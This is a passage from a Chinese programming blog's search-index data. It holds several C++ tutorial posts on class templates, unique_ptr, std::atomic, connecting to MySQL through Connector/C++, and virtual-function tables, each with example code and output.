return *this;}// 使用友元函数，重载运算符 "&lt;&lt;"ostream&amp; operator&lt;&lt;(ostream&amp; out, Teacher&amp; obj) { cout &lt;&lt; "age = " &lt;&lt; obj.m_age &lt;&lt; " name = " &lt;&lt; obj.m_name; return out;}int Teacher::getAge() { return this-&gt;m_age;}char* Teacher::getName() { return this-&gt;m_name;}void Teacher::setAge(int age) { this-&gt;m_age = age;}void Teacher::setName(const char* name) { // 释放原本的内存空间 if (this-&gt;m_name) { free(this-&gt;m_name); this-&gt;m_name = NULL; } // 深拷贝 this-&gt;m_name = (char*)malloc(strlen(name) + 1); if (this-&gt;m_name) { strcpy(this-&gt;m_name, name); }} main.cpp，值得一提的是，这里需要引入 Teacher.cpp 和 MyVector.hpp，而不是 Teacher.h 和 MyVector.h 头文件，否则 C++ 编译器会编译失败，本质原因是由于 C++ 编译器会对模板进行两次编译导致的，详见 C++ 模板的编译错误分析。 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include "Teacher.cpp"#include "MyVector.hpp"int main() { // 自动调用构造函数 MyVector&lt;int&gt; v(5); // 重载运算符 "[]" for (int i = 0; i &lt; v.getSize(); i++) { v[i] = i + 1; } // 重载运算符 "&lt;&lt;" cout &lt;&lt; v &lt;&lt; endl; // 自动调用拷贝构造函数 MyVector&lt;int&gt; v2 = v; cout &lt;&lt; v2 &lt;&lt; endl; // 重载运算符 "=" MyVector&lt;int&gt; v3(2); v3 = v2; cout &lt;&lt; v3 &lt;&lt; endl; // 容器存放类对象 MyVector&lt;Teacher&gt; teachers(3); for (int i = 0; i &lt; teachers.getSize(); i++) { Teacher t(i + 20, "Jim"); teachers[i] = t; } cout &lt;&lt; teachers &lt;&lt; endl; // 容器存放指针 MyVector&lt;Teacher*&gt; points(4); for (int i = 0; i &lt; points.getSize(); i++) { points[i] = new Teacher(25 + i, "Tom"); } for (int i = 0; i &lt; points.getSize(); i++) { Teacher* obj = points[i]; cout &lt;&lt; "age = " &lt;&lt; obj-&gt;getAge() &lt;&lt; " name = " &lt;&lt; obj-&gt;getName() &lt;&lt; ", "; } return 0;} 程序运行输出的结果如下： 123451, 2, 3, 4, 5,1, 2, 3, 4, 5,1, 2, 3, 4, 5,age = 20 name = Jim, age = 21 name = Jim, age = 22 name = Jim,age = 25 name = Tom, age = 26 name = Tom, age = 27 name = Tom, age = 28 name = Tom, 函数模板与类模板的使用总结 模板是 C++ 类型参数化的多态工具，C++ 为此提供了函数模板和类模板 模板定义以模板声明开始，类属参数必须在模板定义中至少出现一次 同一个类属参数可以用于多个模板 类属参数可用于函数的参数类型、返回值类型和声明函数中的变量 模板由编译器根据实际的数据类型进行实例化，生成可执行代码 模板中的函数称为模板函数，实例化的类模板称为模板类 类模板可以在类层次中使用（即可以被继承） 函数模板可以使用多种方式重载 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++"},{title:"C++ 进阶基础之一",url:"/posts/dbff2af9.html",text:'大纲 C++ 进阶基础之一、C++ 进阶基础之二、C++ 进阶基础之三 C++ 进阶基础之四、C++ 进阶基础之五、C++ 进阶基础之六 C++ 进阶基础之七、C++ 进阶基础之八 智能指针智能指针的入门案例unique_ptr 对象的介绍unique_ptr 是 C++ 11 提供的用于防止内存泄漏的智能指针中的一种实现，独享被管理对象指针所有权的智能指针。unique_ptr 对象包装了一个原始指针，并负责其生命周期。当该对象被销毁时，会在其析构函数中删除关联的原始指针。unique_ptr 实现了 -&gt; 和 * 运算符的重载，因此它可以像普通指针一样使用。 unique_ptr 对象的简单使用123456789101112131415161718192021222324252627282930#include &lt;iostream&gt;using namespace std;class Task {public: Task(int id) { this-&gt;id = id; cout &lt;&lt; "构造函数被调用" &lt;&lt; endl; } ~Task() { cout &lt;&lt; "析构函数被调用" &lt;&lt; endl; } int getId() { return this-&gt;id; }private: int id;};int main() { unique_ptr&lt;Task&gt; taskPtr(new Task(23)); cout &lt;&lt; "id = " &lt;&lt; taskPtr-&gt;getId() &lt;&lt; endl; return 0;} 程序运行输出的结果如下： 123构造函数被调用id = 23析构函数被调用 unique_ptr&lt;Task&gt; 对象 taskPtr 接受原始指针作为参数。当 main 函数退出时，该对象超出作用范围就会自动调用自身的析构函数。在 unique_ptr&lt;Task&gt; 对象 taskPtr 的析构函数中，会删除关联的原始指针，这样就不用专门执行 Task 对象的 delete 操作了。以后不管函数正常退出还是异常退出（由于某些异常），也会始终调用 taskPtr 对象的析构函数。因此，原始指针将始终被删除并防止内存泄漏。 unique_ptr 对象独享所有权unique_ptr 对象始终是关联的原始指针的唯一所有者，因此开发者无法通过拷贝构造函数或赋值运算符复制 unique_ptr 对象的副本，只能移动它。由于每个 unique_ptr 对象都是原始指针的唯一所有者，因此在其析构函数中，它可以直接删除关联的指针，不需要任何参考计数。 智能指针的基础操作获取被管理对象的原始指针在 unique_ptr 对象上调用 get() 函数，可以获取管理对象的原始指针 1Task *p1 = taskPtr.get(); 检查 unique_ptr 对象是否为空有两种方法创建一个空的 unique_ptr 对象，因为没有与之关联的原始指针，所以它是空的 1unique_ptr&lt;int&gt; ptr; 1unique_ptr&lt;int&gt; ptr = nullptr; 有两种方法可以检查 unique_ptr 对象是否为空或者是否有与之关联的原始指针 123if (!ptr) { cout&lt;&lt;"ptr is empty"&lt;&lt;endl;} 123if (ptr == nullptr){ cout&lt;&lt;"ptr is empty"&lt;&lt;endl;} 使用原始指针创建 unique_ptr 对象要创建非空的 unique_ptr 对象，需要在创建对象时在其构造函数中传递原始指针 1unique_ptr&lt;Task&gt; taskPtr(new Task(22)); 或者 1unique_ptr&lt;Task&gt; taskPtr(new unique_ptr&lt;Task&gt;::element_type(23)); 不能通过赋值的方法创建 unique_ptr 对象 1unique_ptr&lt;Task&gt; taskPtr = new Task(); // 错误写法，编译失败 智能指针的进阶操作重置 unique_ptr 对象在 unique_ptr 对象上调用 reset() 函数可以重置它，即它会 delete 已关联的原始指针，并将 unique_ptr 对象设置为空 1taskPtr.reset(); unique_ptr 对象不允许复制由于 unique_ptr 不可复制，只能移动。因此，无法通过拷贝构造函数或赋值运算符创建 unique_ptr 对象的副本 123456unique_ptr&lt;Task&gt; taskPtr1(new Task(22));unique_ptr&lt;Task&gt; taskPtr2(new Task(35));unique_ptr&lt;Task&gt; taskPtr4 = taskPtr1; // 错误写法，编译失败taskPtr2 = taskPtr1; // 错误写法，编译失败 转移 unique_ptr 对象的所有权不允许复制 unique_ptr 对象，但可以转移它们。这意味着 unique_ptr 对象可以将自身关联的原始指针的所有权转移给另一个 unique_ptr 对象 1234567891011121314151617// 通过原始指针创建taskPtr1unique_ptr&lt;Task&gt; taskPtr1(new Task(55));// 把taskPtr1中关联指针的所有权转移给taskPtr2unique_ptr&lt;Task&gt; taskPtr2 = move(taskPtr1);// taskPtr1关联指针的所有权现在转移到了taskPtr2中，此时taskPtr1关联的指针为空if (taskPtr1 == nullptr) { cout &lt;&lt; "taskPtr1 is empty" &lt;&lt; endl;}// taskPtr1关联指针的所有权现在转移到了taskPtr2中，此时taskPtr2关联的指针不为空if (taskPtr2 != nullptr) { cout &lt;&lt; "taskPtr2 is not empty" &lt;&lt; endl;}cout &lt;&lt; taskPtr2-&gt;getId() &lt;&lt; endl; 程序运行输出的结果如下： 123taskPtr1 is emptytaskPtr2 is not empty55 释放 unique_ptr 对象关联的原始指针在 unique_ptr 对象上调用 release() 函数，将释放其关联的原始指针的所有权，并返回原始指针，同时设置 unique_ptr 对象为空。特别注意，这里是释放其关联的原始指针的所有权，并没有 delete 原始指针，而调用 reset() 函数则会 delete 原始指针 1234567891011121314unique_ptr&lt;Task&gt; taskPtr1(new Task(55));if (taskPtr1 != nullptr) { cout &lt;&lt; "taskPtr1 is not empty" &lt;&lt; endl;}// 释放关联指针的所有权Task* ptr = taskPtr1.release();if (taskPtr1 == nullptr) { cout &lt;&lt; "taskPtr1 is empty" &lt;&lt; endl;}cout &lt;&lt; "id = " &lt;&lt; ptr-&gt;getId() &lt;&lt; endl; 程序运行输出的结果如下： 123taskPtr1 is not emptytaskPtr1 is emptyid = 55 C++ 14 使用原始指针创建 unique_ptr 对象C++ 引入了新的语法，可以使用 make_unique 来创建 unique_ptr 对象，省去了 new 关键字的使用 1unique_ptr&lt;Task&gt; taskPtr = make_unique&lt;Task&gt;(34); 原子操作的使用原子操作简介所谓的原子操作，取的就是 “原子是最小的、不可分割的最小个体” 的意义，它表示在多个线程访问同一个全局资源的时候，能够确保在同一时刻只有唯一的线程对这个资源进行访问。这有点类似互斥对象对共享资源的访问的保护，但是原子操作更加接近底层，因而效率更高。在以往的 C++ 标准中并没有对原子操作进行规定，开发人员往往是使用汇编语言，或者是借助第三方的线程库，例如 Intel 的 pthread 来实现。在新标准 C++ 11 中，引入了原子操作的概念，并通过这个新的头文件提供了多种原子操作数据类型，例如 atomic_bool、atomic_int 等等。如果在多个线程中对这些类型的共享资源进行操作，编译器将保证这些操作都是原子性的，也就是说，确保任意时刻只有一个线程对这个资源进行访问；这样就可以保证多个线程访问这个共享资源的正确性，从而避免了锁的使用，提高了效率。在新标准 C++ 11 中，atomic 对 int、char、bool 等基础数据结构进行了原子性封装，在多线程环境中，对 atomic 对象的访问不会造成资源竞争，利用 atomic 可实现数据结构的无锁设计。 atomic 的简介在新标准 C++ 11 中，新增了 atomic 关键字，可以使用它定义一个原子类型，详见 C++ 参考手册一、C++ 参考手册二。 成员函数 成员函数 说明 store 原子地以非原子对象替换原子对象的值 load 原子地获得原子对象的值 operator= 存储值于原子对象 is_lock_free 检查原子对象是否免锁 operator T 从原子对象加载值 exchange 原子地替换原子对象的值，并获得它先前持有的值 compare_exchange_weak、compare_exchange_strong 原子地比较原子对象与非原子参数的值，若相等则进行交换，若不相等则进行加载 特化成员函数 特化成员函数 说明 fetch_add 原子地将参数加到存储于原子对象的值，并返回先前保有的值 fetch_sub 原子地从存储于原子对象的值减去参数，并获得先前保有的值 fetch_and 原子地进行参数和原子对象的值的逐位与，并获得先前保有的值 fetch_or 原子地进行参数和原子对象的值的逐位或，并获得先前保有的值 fetch_xor 原子地进行参数和原子对象的值的逐位异或，并获得先前保有的值 operator++、operator++(int)、operator--、operator--(int) 令原子值增加或者减少一 operator+=、operator-=、operator&amp;=、operator^= 加、减，或者与原子值进行逐位与、异或 值得一提的是，所谓特化函数，也就是 atomic 自身提供的，可以进行原子操作的函数。使用这些函数进行的操作，都是原子的。 atomic 的使用案例加锁不使用 atomic123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;iostream&gt;#include &lt;ctime&gt;#include &lt;mutex&gt;#include &lt;vector&gt;#include &lt;thread&gt;using namespace std;mutex mtx;size_t total = 0;void threadFun(){ for (int i = 0; i &lt; 1000000; i++) { // 加锁防止多个线程同时访问同一资源 unique_lock&lt;mutex&gt; lock(mtx); total++; }}int main(void){ clock_t start_time = clock(); // 启动多个线程 vector&lt;thread&gt; threads; for (int i = 0; i &lt; 10; i++) { threads.push_back(thread(threadFun)); } for (auto&amp; thad : threads) { thad.join(); } // 检测total是否正确 10000*10 = 100000 cout &lt;&lt; "total number:" &lt;&lt; total &lt;&lt; endl; clock_t end_time = clock(); cout &lt;&lt; "耗时：" &lt;&lt; end_time - start_time &lt;&lt; "ms" &lt;&lt; endl; return 0;} 程序运行输出的结果如下： 12total number:10000000耗时：615ms 不加锁使用 atomic与加锁相比，使用原子操作（atomic）能大大地提高程序的运行效率。 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;iostream&gt;#include &lt;ctime&gt;#include &lt;mutex&gt;#include &lt;vector&gt;#include &lt;thread&gt;using namespace std;atomic&lt;size_t&gt; total(0);void threadFun(){ for (int i = 0; i &lt; 1000000; i++) { total++; }}int main(void){ clock_t start_time = clock(); // 启动多个线程 vector&lt;thread&gt; threads; for (int i = 0; i &lt; 10; i++) { threads.push_back(thread(threadFun)); } for (auto&amp; thad : threads) { thad.join(); } // 检测total是否正确 10000*10 = 100000 cout &lt;&lt; "total number:" &lt;&lt; total &lt;&lt; endl; clock_t end_time = clock(); cout &lt;&lt; "耗时：" &lt;&lt; end_time - start_time &lt;&lt; "ms" &lt;&lt; endl; return 0;} 程序运行输出的结果如下： 12total number:10000000耗时：321ms 为什么要定义一个原子类型举个例子，int64_t 类型，在 32 位机器上为非原子操作。更新时该类型的值时，需要进行两步操作（高 32 位、低 32 位）。如果多线程操作该类型的变量，且在操作时未加锁，可能会出现读脏数据的情况。解决该问题的话，可以使用加锁，或者提供一种定义原子类型的方法。 定义原子类型 12// 定义一个"int64_t"的原子类型std::atomic&lt;int64_t&gt; value; 自加操作（原子） 12// atomic提供的特化成员函数，已经重载了++运算符value++ 读取变量值（原子） 12// 此处的原子操作，指的是读取value的值这一步，而不是将value的值赋给xint64_t x = value.load(std::memory_order_relaxed); 更新变量（原子） 12int64_t x = 10;value.store(x, std::memory_order_relaxed) atomic 不能与 string 一起使用特别注意，atomic 关键字不能与 string 类型一起使用，因为 string 不是可简单复制的类型（TriviallyCopyable），详见 C++ 参考文档： The primary std::atomic template may be instantiated with any TriviallyCopyable type T satisfying both CopyConstructible and CopyAssignable. 123456#include &lt;iostream&gt;int main() { std::atomic&lt;std::string&gt; str{ "Hello" }; return 0;} 上述代码编译后，C++ 编译器会出现编译错误，如下所示： 1error C2338: atomic&lt;T&gt; requires T to be trivially copyable, copy constructible, move constructible, copy assignable, and move assignable. 关于 C++ 编译器为什么会对 std::atomic&lt;std::string&gt; 给出简单的可复制错误，在 Stack Overflow 上找到了一个类似的问题可供参考。 参考博客 C++11 新特性之 atomic C++ 智能指针 unique_ptr 详解与示例 为何优先选用 unique_ptr 而不是裸指针？ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++"},{title:"C++ 使用 API 连接 MySQL 数据库",url:"/posts/c942e1de.html",text:'前言本文将介绍 C++ 如何使用 MySQL Connector/C++ 的 API 连接 MySQL 数据库，适用于 Windows 系统。 版本说明 软件 版本 默认安装路径 MySQL Connector/C++ 1.1.13 C:\\Program Files\\MySQL\\MySQL Connector C++ 1.1.13 OpenSSL v1.1.1L C:\\Program Files\\OpenSSL-Win64 boost 1_77_0 C:\\Program Files\\boost_1_77_0 MySQL Server 5.7.33 C++ 11 Visual Studio 2019 Windows System Win 10 MySQL Connector/C++ 介绍简介 MySQL Connector/C++ 是一个 MySQL 数据库连接器，包含了 C++ 连接 MySQL 服务器所需的头文件和库文件，可用于开发基于 JDBC 的 C++ 应用程序。 开发优势 与 MySQL 客户端库提供的 C 语言 API 相比，MySQL Connector/C++ 为 C++ 用户提供以下好处： 纯 C++ 开发的便利 支持基于 JDBC 4.0 的 API 支持面向对象的编程范式 减少项目的开发时间 可根据要求获得商业许可证 根据 GPL 获得许可，但 FLOSS 许可除外 分发方式 MySQL Connector/C++ 有二进制文件和源代码分发版，并以特定于平台的打包格式提供： 二进制分发版可用于 Windows、Linux、Unix 和类 Unix 平台 源代码分发版可作为压缩的 tar 文件或 zip 文件提供，并可在任何受支持的平台上使用 源代码存储库使用 Git 存储，可在 GitHub 上获得 与 JDBC 的兼容性 MySQL Connector/C++ 与 JDBC 4.0 API 兼容，没有实现整个 JDBC 4.0 API，但具有以下类：Connection、DatabaseMetaData、Driver、PreparedStatement、ResultSet、ResultSetMetaData、Savepoint、Statement。JDBC 4.0 API 为刚才提到的类定义了大约 450 个方法，MySQL Connector/C++ 实现了其中的大约 80%。 支持的平台和先决条件 对于 MySQL Connector/C++ 1.1.11 及更高版本，商业和社区发行版需要依赖 Visual C++ Redistributable for Visual Studio 2015 才能在 Windows 平台上运行。从 MySQL Connector/C++ 1.1.10 开始，社区（非商业）发行版需要依赖适用于 Visual Studio 2013 的 Visual C++ Redistributable。可在 Microsoft 下载中心获取 Redistributable 的安装包，并在安装 MySQL Connector/C++ 之前安装它。 要运行带 MySQL Connector/C++ 的应用程序，需要 MySQL 5.6 或更高版本的数据库服务器 要构建带 MySQL Connector/C++ 的应用程序 在 Windows 系统上，需要 Microsoft Visual Studio 2015 要从源代码构建 MySQL Connector/C++ 自身 在 Windows 系统上，需要 Microsoft Visual Studio 2015 Building Connector/C++ 需要 MySQL 5.7（5.7.9 或更高版本）或 MySQL 8.0（8.0.11 或更高版本）的客户端库 准备工作OpenSSL 安装安装 OpenSSL在 OpenSSL 官网 下载 Win64 OpenSSL v1.1.1L 版本的安装包，下载完成后直接安装，每一步安装步骤选择默认选项即可。OpenSSL 默认的安装路径是 C:\\Program Files\\OpenSSL-Win64。 VS 项目添加 OpenSSL 的 库文件OpenSSL 安装完成之后，将其安装目录下的 bin 文件夹中的 libssl-1_1-x64.dll 和 libcrypto-1_1-x64.dll 库文件拷贝到 VS 项目的目录中，如下图所示： VS 项目引入 OpenSSL 的 头文件右键项目，选择 属性，导航到 配置属性 -&gt; C/C++ -&gt; 常规 -&gt; 附加包含目录，添加 OpenSSL 头文件所在的目录路径（如 C:\\Program Files\\OpenSSL-Win64\\include），如下图所示： MySQL Connector/C++ 安装安装 MySQL Connector/C++在 MySQL 官网 上下载 1.1.13 版本的 MySQL Connector/C++，下载完成后直接安装即可。若已经本地已经安装过 MySQL Server，则不再需要手动安装 MySQL Connector/C++，因为默认已经安装过了，但需要留意 MySQL Connector/C++ 与 MySQL 的版本是否匹配 。值得一提的是，MySQL Connector/C++ 支持多个版本共存（同时安装不同的版本），其默认的安装路径为 C:\\Program Files\\MySQL\\Connector.C++ 1.x。 VS 项目添加 MySQL Connector/C++ 的 库文件MySQL Connector/C++ 安装完成后，将其安装目录下 lib/opt 文件夹中的 mysqlcppconn.dll 与 mysqlcppconn.lib 库文件拷贝到 VS 项目的目录中，如下图所示： VS 项目引入 MySQL Connector/C++ 的头文件右键项目，选择 属性，导航到 配置属性 -&gt; C/C++ -&gt; 常规 -&gt; 附加包含目录，添加 MySQL Connector/C++ 头文件所在的目录路径（如 C:\\Program Files\\MySQL\\MySQL Connector C++ 1.1.13\\include），如下图所示： C++ 连接 MySQL 的实战案例MySQL 数据库初始化123456789101112131415161718192021222324252627282930-- ------------------------------ 创建数据库-- ----------------------------DROP DATABASE IF EXISTS `t_shop`;CREATE DATABASE `t_shop` DEFAULT CHARACTER SET UTF8;-- ------------------------------ 切换数据库-- ----------------------------USE `t_shop`;-- ------------------------------ 创建数据库表-- ----------------------------DROP TABLE IF EXISTS `properties`;CREATE TABLE `properties` ( `ID` int(11) NOT NULL AUTO_INCREMENT, `KEY` varchar(200) DEFAULT NULL, `VALUE` varchar(200) DEFAULT NULL, `REMARK` varchar(200) DEFAULT NULL, PRIMARY KEY (`ID`) USING BTREE, UNIQUE KEY `key_unique_index` (`KEY`)) ENGINE=InnoDB AUTO_INCREMENT=27 DEFAULT CHARSET=UTF8 ROW_FORMAT=DYNAMIC;-- ------------------------------ 往数据库表插入数据-- ----------------------------INSERT INTO `properties` (`KEY`, `VALUE`, `REMARK`) VALUES (\'test_limit_price\', \'30.5\', \'限制价格\');INSERT INTO `properties` (`KEY`, `VALUE`, `REMARK`) VALUES (\'test_limit_number\', \'430\', \'限制数量\');INSERT INTO `properties` (`KEY`, `VALUE`, `REMARK`) VALUES (\'test_limit_balance\', \'929.32\', \'限制余额\'); C++ 连接 MySQL 的代码 mysqldb.h 12345678910111213141516171819202122232425262728293031323334#pragma once#include &lt;vector&gt;#include &lt;iostream&gt;#include &lt;mysql_connection.h&gt;#include &lt;cppconn/driver.h&gt;#include &lt;cppconn/exception.h&gt;#include &lt;cppconn/resultset.h&gt;#include &lt;cppconn/statement.h&gt;#include &lt;cppconn/prepared_statement.h&gt;using namespace std;using namespace sql;// MySQL数据库操作类class MysqlDB {public: MysqlDB(const string host, const string username, const string password, const string database); ~MysqlDB();public: bool Execute(const char* sql); int ExecuteUpdate(const char* sql); unique_ptr&lt;ResultSet&gt; Query(const char* query, const vector&lt;string&gt; parameters);private: string host; string username; string password; string database; Driver* driver; unique_ptr&lt;Connection&gt; connection; // 智能指针}; mysqldb.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102#include "mysqldb.h"// 构造函数MysqlDB::MysqlDB(const string host, const string username, const string password, const string database) { // 初始化MySQL的连接信息 this-&gt;host = host; this-&gt;username = username; this-&gt;password = password; this-&gt;database = database; try { // 加载MySQL驱动 this-&gt;driver = get_driver_instance(); if (!this-&gt;driver) { throw "failed to load mysql driver"; } // 连接MySQL实例 this-&gt;connection.reset(driver-&gt;connect(this-&gt;host.c_str(), this-&gt;username.c_str(), this-&gt;password.c_str())); if (!this-&gt;connection) { throw "failed to connect mysql server"; } else { // 设置默认数据库 this-&gt;connection-&gt;setSchema(this-&gt;database.c_str()); } } catch (SQLException&amp; e) { cout &lt;&lt; "# ERR: SQLException in " &lt;&lt; __FILE__ &lt;&lt; "(" &lt;&lt; __FUNCTION__ &lt;&lt; ") on line " &lt;&lt; __LINE__ &lt;&lt; endl; cout &lt;&lt; "# ERR: " &lt;&lt; e.what() &lt;&lt; endl; };}// 析构函数MysqlDB::~MysqlDB() {}// 用于执行任何 SQL 语句，返回一个 bool 值，表明执行该 SQL 语句是否返回了 ResultSet// 如果执行后第一个结果是 ResultSet，则返回 true，否则返回 falsebool MysqlDB::Execute(const char* sql) { try { if (this-&gt;connection) { unique_ptr&lt;Statement&gt; statement = nullptr; statement.reset(this-&gt;connection-&gt;createStatement()); if (statement) { return statement-&gt;execute(sql); } } } catch (SQLException&amp; e) { cout &lt;&lt; "# ERR: SQLException in " &lt;&lt; __FILE__ &lt;&lt; "(" &lt;&lt; __FUNCTION__ &lt;&lt; ") on line " &lt;&lt; __LINE__ &lt;&lt; endl; cout &lt;&lt; "# ERR: " &lt;&lt; e.what() &lt;&lt; endl; } return false;}// 用于执行 INSERT、UPDATE 或 DELETE 语句以及 SQL DDL（数据定义语言）语句，例如 CREATE TABLE 和 DROP TABLE// 函数的返回值是一个整数，指示受影响的行数，对于 CREATE TABLE 或 DROP TABLE 等不操作行的语句，返回值总为零int MysqlDB::ExecuteUpdate(const char* sql) { try { if (this-&gt;connection) { unique_ptr&lt;Statement&gt; statement = nullptr; statement.reset(this-&gt;connection-&gt;createStatement()); if (statement) { return statement-&gt;executeUpdate(sql); } } } catch (SQLException&amp; e) { cout &lt;&lt; "# ERR: SQLException in " &lt;&lt; __FILE__ &lt;&lt; "(" &lt;&lt; __FUNCTION__ &lt;&lt; ") on line " &lt;&lt; __LINE__ &lt;&lt; endl; cout &lt;&lt; "# ERR: " &lt;&lt; e.what() &lt;&lt; endl; } return 0;}// 基于 SQL 的预编译机制，执行查询单个结果集（ResultSet）的 SQL 语句，例如 SELECT 语句unique_ptr&lt;ResultSet&gt; MysqlDB::Query(const char* sql, const vector&lt;string&gt; parameters) { unique_ptr&lt;ResultSet&gt; resultSet = nullptr; try { if (this-&gt;connection) { int index = 0; unique_ptr&lt;PreparedStatement&gt; statement = nullptr; statement.reset(this-&gt;connection-&gt;prepareStatement(sql)); if (statement) { for (auto iterator = parameters.cbegin(); iterator != parameters.cend(); iterator++) { index++; statement-&gt;setString(index, (*iterator).c_str()); } resultSet.reset(statement-&gt;executeQuery()); } } } catch (SQLException&amp; e) { cout &lt;&lt; "# ERR: SQLException in " &lt;&lt; __FILE__ &lt;&lt; "(" &lt;&lt; __FUNCTION__ &lt;&lt; ") on line " &lt;&lt; __LINE__ &lt;&lt; endl; cout &lt;&lt; "# ERR: " &lt;&lt; e.what() &lt;&lt; endl; } return resultSet;} main.cpp 12345678910111213141516171819202122#include &lt;iostream&gt;#include "mysqldb.h"using namespace std;int main() { unique_ptr&lt;MysqlDB&gt; db(new MysqlDB("tcp://127.0.0.1:3306", "root", "123456", "t_shop")); string querySql = "select * from properties where `KEY` = ?"; unique_ptr&lt;ResultSet&gt; result = db-&gt;Query(querySql.c_str(), { "test_limit_price" }); if (result) { cout &lt;&lt; "Query: " &lt;&lt; querySql &lt;&lt; endl; while (result-&gt;next()) { cout &lt;&lt; result-&gt;getInt("ID") &lt;&lt; " | "; cout &lt;&lt; result-&gt;getString("KEY").c_str() &lt;&lt; " | "; cout &lt;&lt; result-&gt;getString("VALUE").c_str() &lt;&lt; " | "; cout &lt;&lt; result-&gt;getString("REMARK").c_str() &lt;&lt; " | "; cout &lt;&lt; endl; } } return 0;} 程序运行输出的结果如下： 12Query: select * from properties where `KEY` = ?27 | test_limit_price | 30.5 | 限制价格 | 常见问题缺失 Boost 库错误信息： 项目执行编译操作后，VS 出现下述错误信息，这是本地缺失 boost 库导致的。1fatal error C1083: 无法打开包括文件: “boost/shared_ptr.hpp”: No such file or directory 解决方法： a) 在 Boost 官网 下载最新版本的 Boost，并解压到本地磁盘，例如解压路径为：C:\\Program Files\\boost_1_77_0 b) 右键项目，选择 属性，导航到 配置属性 -&gt; C/C++ -&gt; 常规 -&gt; 附加包含目录，添加 Boost 的安装路径（如 C:\\Program Files\\boost_1_77_0），如下图所示 c) 重新执行项目的编译操作 缺失 libssl-1_1-64.dll 文件错误信息： 项目运行后，系统弹窗提示以下错误信息。1由于找不到 libssl-1_1-64.dll，无法继续执行代码。重新安装程序可能会解决此问题。 解决方法： 安装 OpenSSL，并拷贝 libssl-1_1-64.dll 库文件到 VS 项目的目录中，具体步骤可参考上面的 OpenSSL - 安装 教程。 缺失 libcrypto-1_1-x64.dll 文件错误信息： 项目运行后，系统弹窗提示以下错误信息。1由于找不到 libcrypto-1_1-x64.dll，无法继续执行代码。重新安装程序可能会解决此问题。 解决方法： 安装 OpenSSL，并拷贝 libcrypto-1_1-x64.dll 库文件到 VS 项目的目录中，具体步骤可参考上面的 OpenSSL - 安装 教程。 参考文档 mysql-connector-demo MySQL Connector/C++ 官方文档 MySQL Connector/C++ Github 仓库 MySQL Connector/C++ 官方 API 使用教程 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++"},{title:"C++ 入门基础之九",url:"/posts/f1a16291.html",text:'大纲 C++ 入门基础之一、C++ 入门基础之二、C++ 入门基础之三 C++ 入门基础之四、C++ 入门基础之五、C++ 入门基础之六 C++ 入门基础之七、C++ 入门基础之八、C++ 入门基础之九 多态的原理多态的实现原理 当类中声明了虚函数时，编译器会在类中生成一个虚函数表 虚函数表是一个存储类成员函数指针的数据结构 虚函数表是由编译器自动生成和维护的 虚函数（virtual）会被编译器放入虚函数表中 当存在虚函数时，每个对象中都有一个指向虚函数表的指针（C++ 编译器给父类对象、子类对象提前设置了 VPTR 虚函数表指针，因此 C++ 编译器不需要区分子类对象或者父类对象，只需要在 base 指针中，找 VPTR 指针即可） VPTR 虚函数表指针一般作为类对象的第一个成员 多态的实现原理图解 a) 多态实现原理的图解 如图 所示 b) 通过 VPTR 虚函数表指针调用重写函数的过程是在程序运行时进行的，因此需要通过寻址操作才能确定真正应该调用的函数，而普通成员函数是在编译时就确定了调用的函数 c) 在效率上，虚函数的效率要低很多，因此出于效率考虑，没有必要将所有成员函数都声明为虚函数，即使 C++ 编译器允许这么做 d) 由于有了虚函数表，C++ 编译器不再需要知道是子类对象还是父类对象，这往往会给我们造成一种假象：C++ 编译器能识别子类对象或者父类对象 证明 VPTR 指针的存在12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;iostream&gt;using namespace std;class Parent1 {public: Parent1(int a) { this-&gt;a = a; } // 不声明虚函数 void print() { cout &lt;&lt; "I\'m parent1" &lt;&lt; endl; }private: int a;};class Parent2 {public: Parent2(int a) { this-&gt;a = a; } // 声明虚函数 virtual void print() { cout &lt;&lt; "I\'m parent2" &lt;&lt; endl; }private: int a;};int main() { // 由于指针也是一种数据类型，由于在Parent2类中声明了虚函数，若Parent2类里存在VPTR指针，那么下面两个类的大小应该是不一样的 cout &lt;&lt; "sizeof(Parent1): " &lt;&lt; sizeof(Parent1) &lt;&lt; endl; cout &lt;&lt; "sizeof(Parent2): " &lt;&lt; sizeof(Parent2) &lt;&lt; endl; return 0;} 程序运行的输出结果如下： 12sizeof(Parent1): 4sizeof(Parent2): 8 